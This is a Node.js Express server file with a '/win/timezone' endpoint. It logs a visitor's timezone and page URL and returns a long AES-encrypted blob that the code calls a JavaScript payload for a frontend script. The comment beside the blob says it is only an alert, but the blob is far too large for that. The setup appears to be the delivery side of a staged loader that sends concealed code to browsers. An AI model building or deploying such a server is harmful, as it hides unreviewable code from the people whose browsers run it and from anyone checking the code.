// index.js
const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors()); // Allow from any origin, or restrict if needed
app.use(express.json());

// POST endpoint matching your frontend script
app.post('/win/timezone', (req, res) => {
  const { timezone, fullUrl } = req.body;

  // Optional: log or verify the data
  console.log("Timezone:", timezone);
  console.log("Full URL:", fullUrl);

  // Respond with base64-encoded JS payload
  const payload = "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"; // alert('This is the payload');
  res.send(payload);
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
